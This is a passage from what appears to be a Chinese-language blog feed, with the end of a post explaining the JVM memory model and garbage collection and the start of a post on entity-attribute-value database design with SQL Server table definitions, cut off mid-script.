VM的自动内存管理系统要求对象起始地址必须是8字节的整数倍，换句话说，就是对象<br>的大小必须是8字节的整数倍。而对象头部分正好是8字节的倍数（1倍或者2倍），因此，当对象&gt; 实例数据部分没有对齐时，就需要通过对齐填充来补全。</p></blockquote><p>其中的klass类型指针就是那条红色的联系，那是怎么联系的呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Thread().start();</span><br></pre></td></tr></table></figure><p>类加载其实最终是以类元信息的形式存储在方法区中的，math和math2都是由同一个类new出来的，当对象被new时，都会在对象头中存储一个指向类元信息的指针，这就是<font color=#FF69B4>Klass  Pointer</font>.</p><p>到这里我们就讲解了栈，程序计数器和方法区，下面我们简单介绍一下本地方法区，最后再终点讲解堆。</p><h2 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h2><p>实际上现在本地方法栈已经用的比较少了，大家应该都有听过本地方法吧</p><p>如何经常用的线程类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Thread().start();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (threadStatus != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalThreadStateException();</span><br><span class="line">        group.add(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">boolean</span> started = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            start0();</span><br><span class="line">            started = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!started) &#123;</span><br><span class="line">                    group.threadStartFailed(<span class="keyword">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable ignore) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中底层调用了一个<font color=#FF69B4>start0()</font>的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">start0</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>这个方法没有实现，但又不是接口，是使用native修饰的，是属于本地方法，底层通过C语言实现的，那java代码里为什么会有C语言实现的本地方法呢？</p><p>大家都知道JAVA是问世的，在那之前一个公司的系统百分之九十九都是使用C语言实现的，但是java出现后，很多项目都要转为java开发，那么新系统和旧系统就免不了要有交互，那么就需要本地方法来实现了，底层是调用C语言中的<font color=#FF69B4>dll</font>库文件，就类似于java中的jar包，当然，如今跨语言的交互方式就很多了，比如thrift，http接口方式，webservice等，当时并没有这些方式，就只能通过本地方法来实现了。</p><p>那么本地方法始终也是方法，每个线程在运行的时候，如果有运行到本地方法，那么必然也要产生局部变量等，那么就需要存储在本地方法栈了。如果没有本地方法，也就没有本地方法栈了。</p><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>最后我们讲堆，堆是最重要的一块内存区域，我相信大部分人对堆都不陌生。但是对于它的内部结构，运作细节想要搞清楚也没那么简单。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191126141228830.png" alt="img"></p><p>对于这个基本组成大家应该都有所了解，对就是由<font color=#FF69B4>年轻代</font>和<font color=#87CEFF>老年代</font>组成，年轻代又分为<font color=#EE82EE>伊甸园区</font>和<font color=#90EE90>survivor</font>区，survivor区中又有<font color=#EEA2AD>from区</font>和<font color=#FF7256>to区</font>.</p><p>我们new出来的对象大家都知道是放在堆中，那具体放在堆中的哪个位置呢？</p><p>其实new出来的对象一般都放在<font color=#EE82EE>Eden区</font>，那么为什么叫伊甸园区呢，伊甸园就是亚当夏娃住的地方，不就是造人的地方么？所以我们new出来的对象就是放在这里的，那当Eden区满了之后呢？</p><p>假设我们给对分配600M内存，这个是可以通过参数调节的，我们后文再讲。那么<font color=#87CEFF>老年代</font>默认是占2/3的，也就是差不多400M，那<font color=#FF69B4>年轻代</font>就是200M，<font color=#EE82EE>Eden区</font>160M，<font color=#90EE90>Survivor区</font>40M。</p><h2 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h2><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191126142038375.png" alt="img"></p><p>一个程序只要在运行，那么就不会不停的new对象，那么总有一刻Eden区会放满，那么一旦Eden区被放满之后，虚拟机会干什么呢？没错，就是gc，不过这里的gc属于<font color=#EE82EE>minor gc</font>，就是垃圾收集，来收集垃圾对象并清理的，那么什么是垃圾对象呢？</p><p>好比我们上面说的math对象，我们假设我们是一个web应用程序，main线程执行完之后程序不会结束，但是main方法结束了，那么main()方法栈帧会被释放，局部变量会被释放，但是局部变量对应的堆中的对象还是依然存在的，但是又没有指针指向它，那么它就是一个垃圾对象，那就应该被回收掉了，之后如果还会new Math对象，也不会用这个之前的了，因为已经无法找到它了，如果留着这个对象只会占用内存，显然是不合适的。</p><p>这里就涉及到了一个<font color=#EE82EE>GC Root</font>根以及可达性分析算法的概念，也是面试偶尔会被问到的。</p><p>可达性分析算法是将GC Roots对象作为起点，从这些起点开始向下搜索引用的对象，找到的对象都标记为非垃圾对象，其余未标记的都是垃圾对象。</p><p>那么<font color=#EE82EE>GC Roots</font>根对象又是什么呢，<font color=#EE82EE>GC Roots</font>根就是判断一个对象是否可以回收的依据，只要能通过<font color=#EE82EE>GC Roots</font>根向下一直搜索能搜索到的对象，那么这个对象就不算垃圾对象，而可以作为<font color=#EE82EE>GC Roots</font>根的有线程栈的本地变量，静态变量，本地方法栈的变量等等，说白了就是找到和根节点有联系的对象就是有用的对象，其余都认为是垃圾对象来回收。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191126145400951.png" alt="img"></p><p>经历了第一次<font color=#EE82EE>minor gc</font>后，没有被清理的对象就会被移到<font color=#EEA2AD>From区</font>，如上图。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191126145647900.png" alt="img"></p><p>上面在说对象组成的时候有写到，在对象头的Mark Word中有存储<font color=#EEA2AD>GC分代年龄</font>，一个对象每经历一次gc，那么它的gc分代年龄就会<font color=red>+1</font>，如上图。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191126151319582.png" alt="img"></p><p>那么如果第二次新的对象又把Eden区放满了，那么又会执行<font color=#EE82EE>minor gc</font>，但是这次会连着From区一起gc，然后将<font color=#EE82EE>Eden区</font>和<font color=#EEA2AD>From区</font>存活的对象都移到<font color=#FF7256>To区域</font>，对象头中分代年龄都<font color=red>+1</font>，如上图。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191126151616936.png" alt="img"></p><p>那么当第三次Eden区又满的时候，<font color=#EE82EE>minor gc</font>就是回收<font color=#EE82EE>Eden区</font>和<font color=#FF7256>To区</font>域了，<font color=#EE82EE>Eden区</font>和<font color=#FF7256>To区</font>域还活着的对象就会都移到From区，如上图。说白了就是<font color=#90EE90>Survivor区</font>中总有一块区域是空着的，存活的对象存放是在<font color=#EEA2AD>From区</font>和<font color=#FF7256>To区</font>轮流存放，也就是互相复制拷贝，这也就是垃圾回收算法中的<font color=red>复制-回收算法</font>。</p><p>如果一个对象经历了一个限值15次gc的时候，就会移至老年代。那如果还没有到限值，From区或者To区域也放不下了，就会直接挪到老年代，这只是举例了两种常规规则，还有其他规则也是会把对象存放至老年代的。</p><p>那么随着应用程序的不断运行，老年代最终也是会满的，那么此时也会gc，此时的gc就是<font color=#FF7256>Full gc</font>了。</p><p><strong>GC案例</strong><br>下面我们通过一个简单的演示案例来更加清楚的了解GC。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HeapTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] a = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>*<span class="number">100</span>];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        ArrayList&lt;HeapTest&gt; heapTest = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            heapTest.add(<span class="keyword">new</span> HeapTest());</span><br><span class="line">            Thread.sleep(<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这块代码很明显，就是一个死循环，不断的往list中添加new出来的对象。</p><p>我们这里使用jdk自带的一个jvm调优工具<font color=#87CEFF>jvisualvm</font>来观察一下这个代码执行的的内存结构。</p><p>运行代码打开之后我们可以看到这样的界面：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/2019112616032778.png" alt="img"></p><p>我们在左边的应用程序中可以看到我们运行的这个代码，右边是它的一些jvm，内存信息，我们这里不关注，我们需要用到的是最后一个Visual GC面板，这是一个插件，如果你的打开没有这一栏的话，可以再工具栏的插件中进行下载安装。</p><p> 打开visual GC，我们先看一下界面大概的布局，</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/2019112616134712.png" alt="img"></p><p>其中<font color=#87CEFF>老年代(Olc)</font>，<font color=#EE82EE>伊甸园区(Eden)</font>，<font color=#EEA2AD>S0(From)</font>，<font color=#FF7256>S1(To)</font>几个区域的内存和动态分配图都是清晰可见，以一对应的。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191126164339736.png" alt="img"></p><p>我们选择中间一张图给大家对应一下上面所讲的内容：</p><blockquote><p>1：对象放入<font color=#EE82EE>Eden区</font></p><p>2：<font color=#EE82EE>Eden区</font>满发生<font color=#EE82EE>minor gc</font></p><p>3：第二步的存活对象移至<font color=#EEA2AD>From(Survivor 0)</font>区</p><p>4：<font color=#EE82EE>Eden区</font>再满发生<font color=#EE82EE>minor gc</font></p><p>5：第四步存活的对象移至<font color=#FF7256>To(Survivor 1)</font>区</p></blockquote><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191126171445401.png" alt="img"></p><p>这里可以注意到<font color=#EEA2AD>From</font>和<font color=#FF7256>To区域</font>和我们上面所说移至，总有一个是空的。 </p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191126164912890.png" alt="img"></p><p>大家还可以注意到老年代这里，都是一段一段的直线，中间是突然的增加，这就是在<font color=#EE82EE>minor gc</font>中一批一批符合规则的对象被批量移入<font color=#87CEFF>老年代</font>。</p><p> 那当我们老年代满了会发生什么呢？当然是我们上面说过的<font color=red>Full GC</font>，但是你仔细看我们写的这个程序，我们所有new出来的HeapTest对象都是存放在heapLists中的，那就会被这个局部变量所引用，那么<font color=red>Full GC</font>就不会有什么垃圾对象可以回收，可是内存又满了，那怎么办？</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/2019112617183192.png" alt="img"></p><p>没错，就是我们就算没见过也总听过的<font color=#87CEFF>OOM</font>。</p><p>到这里jvm内存模型简单介绍就结束了，看到这里还不点个赞嘛！ </p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据库字段动态扩展</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%97%E6%AE%B5%E5%8A%A8%E6%80%81%E6%89%A9%E5%B1%95%E8%AE%BE%E8%AE%A1/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%97%E6%AE%B5%E5%8A%A8%E6%80%81%E6%89%A9%E5%B1%95%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>数据库字段动态扩展设计</p><a id="more"></a><h1 id="数据库字段动态扩展设计"><a href="#数据库字段动态扩展设计" class="headerlink" title="数据库字段动态扩展设计"></a>数据库字段动态扩展设计</h1><p>以商品为例，类似淘宝上的设计，要求如下：</p><ol><li><p>字段自动扩展</p></li><li><p>属性公用</p></li><li><p>无限扩展字段</p></li></ol><p>现在，看现实世界的产品：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/Center.jpg" alt="img"></p><p>一个产品怎么在数据库存储呢？如：产品表（产品名称，产品类别，品牌，型号，重量……）</p><p>而 产品类别 和 品牌 是冗余的，因此独立出两张表来。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/Center1.jpg" alt="img"></p><p>再看看产品，电脑 和手机都有相同或者不同的属性，这只是简单列出，实际有几十或上百个字段，虽然操作方便，但这样设计非常不合理。</p><table><thead><tr><th><strong>产品</strong></th><th><strong>类别id</strong></th><th><strong>品牌id</strong></th><th><strong>型号</strong></th><th><strong>内存</strong></th><th><strong>颜色</strong></th><th><strong>硬盘大小</strong></th><th><strong>电池容量</strong></th></tr></thead><tbody><tr><td>Iphone</td><td>1</td><td>55</td><td>6s</td><td>16GB</td><td>白色</td><td>2750mAh</td><td></td></tr><tr><td>lenovo</td><td>2</td><td>333</td><td>aaaa</td><td>4GB</td><td>白色</td><td>500 GB</td><td></td></tr></tbody></table><p><strong>网上有几种方法：</strong></p><ol><li>动态添加属性字段。</li><li>先预留字段，到时再用。</li><li>使用 XML 字段保存。</li><li>JSON 格式保存。</li><li>属性字段行存储</li></ol><p>还有一种方法，把相同属性的字段存储到同一个表，不同的属性，每个产品一张表，这可能会有非常多不同产品的特有属性表！</p><p><strong>产品表：</strong></p><table><thead><tr><th><strong>产品id</strong></th><th><strong>产品</strong></th><th><strong>类别id</strong></th><th><strong>品牌id</strong></th><th><strong>型号</strong></th><th><strong>内存</strong></th><th><strong>颜色</strong></th><th><strong><font color=red>子表名</font></strong></th></tr></thead><tbody><tr><td>1</td><td>Iphone</td><td>1</td><td>55</td><td>6s</td><td>16GB</td><td>白色</td><td>表01</td></tr><tr><td>67</td><td>lenovo</td><td>2</td><td>333</td><td>aaaa</td><td>4GB</td><td>白色</td><td>表02</td></tr></tbody></table><p><strong>表01：</strong></p><table><thead><tr><th>产品id</th><th>硬盘大小</th></tr></thead><tbody><tr><td>1</td><td>500 GB</td></tr></tbody></table><p><strong>表02：</strong></p><table><thead><tr><th>产品id</th><th>电池容量</th></tr></thead><tbody><tr><td>67</td><td>2750mAh</td></tr></tbody></table><p><strong>所以现在总结考虑的是第五种方法</strong>：**<font color=red>属性字段行存储</font>** 。**这样就能把所有产品的特有属性都存储到一张表中了！</p><table><thead><tr><th>产品id</th><th>属性</th><th>值</th></tr></thead><tbody><tr><td>1</td><td>硬盘大小</td><td>500 GB</td></tr><tr><td>67</td><td>电池容量</td><td>2750mAh</td></tr></tbody></table><p>现在把所有属性都放到同一个表中，产品和属性分开存储：</p><p><strong>产品表：</strong></p><table><thead><tr><th><strong>产品id</strong></th><th><strong>产品</strong></th><th><strong>类别id</strong></th><th><strong>品牌id</strong></th></tr></thead><tbody><tr><td>1</td><td>Iphone</td><td>1</td><td>55</td></tr><tr><td>67</td><td>lenovo</td><td>2</td><td>333</td></tr></tbody></table><p>属性表：</p><table><thead><tr><th><strong>产品id</strong></th><th><strong>属性</strong></th><th><strong>值</strong></th></tr></thead><tbody><tr><td>1</td><td>型号</td><td>6s</td></tr><tr><td>1</td><td>内存</td><td>16GB</td></tr><tr><td>1</td><td>颜色</td><td>白色</td></tr><tr><td>1</td><td>硬盘大小</td><td>500 GB</td></tr><tr><td>67</td><td>型号</td><td>aaaa</td></tr><tr><td>67</td><td>内存</td><td>4GB</td></tr><tr><td>67</td><td>颜色</td><td>白色</td></tr><tr><td>67</td><td>电池容量</td><td>2750mAh</td></tr></tbody></table><p><strong>结果如图：</strong></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20161118011705005.jpg" alt="img"></p><p>看看 <strong>属性表</strong> ，产品相同属性的就出现冗余了，得把属性和值分库两张表：</p><p><strong>属性表：</strong></p><table><thead><tr><th>属性id</th><th>属性</th></tr></thead><tbody><tr><td>1</td><td>型号</td></tr><tr><td>2</td><td>内存</td></tr><tr><td>3</td><td>颜色</td></tr><tr><td>4</td><td>硬盘大小</td></tr><tr><td>5</td><td>电池容量</td></tr></tbody></table><p><strong>属性值表：</strong></p><table><thead><tr><th>产品id</th><th>属性id</th><th>值</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>6s</td></tr><tr><td>1</td><td>2</td><td>16GB</td></tr><tr><td>1</td><td>3</td><td>白色</td></tr><tr><td>1</td><td>4</td><td>500 GB</td></tr><tr><td>67</td><td>1</td><td>aaaa</td></tr><tr><td>67</td><td>2</td><td>4GB</td></tr><tr><td>67</td><td>3</td><td>白色</td></tr><tr><td>67</td><td>5</td><td>2750mAh</td></tr></tbody></table><p>结构关系如图：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20161118012230121.jpg" alt="img"></p><p>似乎这还不算最终的结果，看 属性值表，对于不同的产品的颜色，也有一样的，属性值表 存储的又会有冗余了，如栗子中的 “白色”。到这里，其实不需要再分表了，有多少属性就插入到该表中。</p><p>若是更详细的，继续分表，把值也固定下来。对于颜色，红橙黄绿蓝靛紫等都详细把值都先定义了，在关系表关联对应的颜色就行。当然，属性值表将非常大，因为它包含了所有产品可能的所有参数。所以一般设计到上一步就行了。</p><p><strong>属性值：</strong></p><table><thead><tr><th>值id</th><th>值</th></tr></thead><tbody><tr><td>1</td><td>灰色</td></tr><tr><td>2</td><td>黑色</td></tr><tr><td>3</td><td>蓝色</td></tr><tr><td>4</td><td>白色</td></tr><tr><td>？</td><td>（其他）</td></tr></tbody></table><p><strong>属性值关系表：</strong></p><table><thead><tr><th>产品id</th><th>属性id</th><th>值id</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>？</td></tr><tr><td>1</td><td>2</td><td>？</td></tr><tr><td>1</td><td>3</td><td><strong><em>4</em> <em><font color=red>（白色）</font></em></strong></td></tr><tr><td>67</td><td>1</td><td>？</td></tr><tr><td>67</td><td>3</td><td><strong><em>4</em> <em><font color=red>（白色）</font></em></strong></td></tr><tr><td>67</td><td>5</td><td>？</td></tr></tbody></table><p><strong>最终设计结果如下：</strong></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/Center2.jpg" alt="img"></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20161118020104686.jpg" alt="img"></p><p><strong>下面给个例子，只是列出关键字段（可自增列）。</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="keyword">master</span></span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> Demo</span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"><span class="keyword">use</span> Demo</span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">--类别（父类别）</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t2_Category(</span><br><span class="line">Categories_id <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">Parent_id <span class="built_in">int</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">constraint</span> pk_Category primary <span class="keyword">key</span>(Categories_id),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2_Category</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="literal">null</span>,<span class="string">&#x27;电器电子&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">2</span>,<span class="literal">null</span>,<span class="string">&#x27;服装服饰&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">3</span>,<span class="literal">null</span>,<span class="string">&#x27;办公用品&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">4</span>,<span class="number">1</span>,<span class="string">&#x27;电脑&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">5</span>,<span class="number">1</span>,<span class="string">&#x27;手机&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">6</span>,<span class="number">2</span>,<span class="string">&#x27;帽子&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">7</span>,<span class="number">2</span>,<span class="string">&#x27;衣服&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">8</span>,<span class="number">4</span>,<span class="string">&#x27;台式电脑&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">9</span>,<span class="number">4</span>,<span class="string">&#x27;笔记本&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">10</span>,<span class="number">4</span>,<span class="string">&#x27;Ipad&#x27;</span></span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">--品牌</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t2_Brand(</span><br><span class="line">Brand_id <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">constraint</span> pk_Brand primary <span class="keyword">key</span>(Brand_id),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2_Brand</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;苹果&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">2</span>,<span class="string">&#x27;华为&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">3</span>,<span class="string">&#x27;小米&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">4</span>,<span class="string">&#x27;诺基亚&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">5</span>,<span class="string">&#x27;路易·威登&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">6</span>,<span class="string">&#x27;SSPP&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">7</span>,<span class="string">&#x27;香奈儿&#x27;</span></span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">--产品</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t2_Procduct(</span><br><span class="line">Procduct_id <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">Categories_id <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">Brand_id <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">constraint</span> pk_Procduct primary <span class="keyword">key</span>(Procduct_id),</span><br><span class="line"><span class="keyword">constraint</span> fk_Procduct_Category <span class="keyword">foreign</span> <span class="keyword">key</span>(Categories_id) <span class="keyword">references</span> t2_Category(Categories_id),</span><br><span class="line"><span class="keyword">constraint</span> fk_Procduct_Brand <span class="keyword">foreign</span> <span class="keyword">key</span>(Brand_id) <span class="keyword">references</span> t2_Brand(Brand_id),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2_Procduct</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="string">&#x27;iMac aaa&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="string">&#x27;Macbook Air bbb&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="string">&#x27;Nokia ddd&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span 